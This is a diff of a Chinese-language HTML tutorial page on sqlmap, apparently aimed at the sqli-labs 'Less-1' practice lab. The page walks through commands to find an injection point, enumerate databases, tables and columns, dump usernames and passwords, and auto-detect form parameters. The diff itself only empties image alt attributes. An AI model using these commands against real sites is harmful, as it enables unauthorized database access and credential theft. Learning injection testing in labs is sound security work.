@@ -16,32 +16,32 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1</span><br><span class="line">sqlmap --url http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
 
 <p>找到注入点</p>
-<p><img src="658713eb7e9d3b973c3b5d530b3727c9.png" alt="img"></p>
+<p><img src="658713eb7e9d3b973c3b5d530b3727c9.png" alt=""></p>
 <h1 id="列出所有数据库信息"><a href="#列出所有数据库信息" class="headerlink" title="列出所有数据库信息"></a>列出所有数据库信息</h1><p>使用 <code>--dbs</code> 参数列出所有数据库信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
 
 <p>结果</p>
-<p><img src="b7cee69b9aa54c3fcdef4a52a8fb81b6.png" alt="img"></p>
+<p><img src="b7cee69b9aa54c3fcdef4a52a8fb81b6.png" alt=""></p>
 <h1 id="列出当前正在使用的数据库"><a href="#列出当前正在使用的数据库" class="headerlink" title="列出当前正在使用的数据库"></a>列出当前正在使用的数据库</h1><p>使用 <code>--current-db</code> 参数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --current-db</span><br></pre></td></tr></table></figure>
 
 <p>当前使用的数据库为security</p>
-<p><img src="436133655c6c2418d0d195d1560cfe93.png" alt="img"></p>
+<p><img src="436133655c6c2418d0d195d1560cfe93.png" alt=""></p>
 <h1 id="列出数据表"><a href="#列出数据表" class="headerlink" title="列出数据表"></a>列出数据表</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，然后用 <code>--tables</code> 参数列出数据库的所有表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
 
 <p>结果</p>
-<p><img src="88205762d56fc26858d1c5c8ce5e3fc3.png" alt="img"></p>
+<p><img src="88205762d56fc26858d1c5c8ce5e3fc3.png" alt=""></p>
 <h1 id="列出字段"><a href="#列出字段" class="headerlink" title="列出字段"></a>列出字段</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，然后用 <code>-T &lt;表名&gt;</code> 参数指定表，最后用 <code>--columns</code> 参数列出所有字段</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
 
 <p>结果</p>
-<p><img src="ab4001ee8ff9a26b87b5939580e46806.png" alt="img"></p>
+<p><img src="ab4001ee8ff9a26b87b5939580e46806.png" alt=""></p>
 <h1 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，用 <code>-T &lt;表名&gt;</code> 参数指定表，然后用 <code>-C &lt;字段名&gt;</code> 参数指定字段（用逗号分隔多个字段），最后用 <code>--dump</code> 参数读取数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>
 
 <p>结果</p>
-<p><img src="ffa6f23973774b3b7c2078f7c0bfd65f.png" alt="img"></p>
+<p><img src="ffa6f23973774b3b7c2078f7c0bfd65f.png" alt=""></p>
 <h1 id="对于POST请求的注入"><a href="#对于POST请求的注入" class="headerlink" title="对于POST请求的注入"></a>对于POST请求的注入</h1><h2 id="自动搜索参数"><a href="#自动搜索参数" class="headerlink" title="自动搜索参数"></a>自动搜索参数</h2><p>使用 <code>--forms</code> 参数自动搜索注入点</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --forms</span><br></pre></td></tr></table></figure>
 
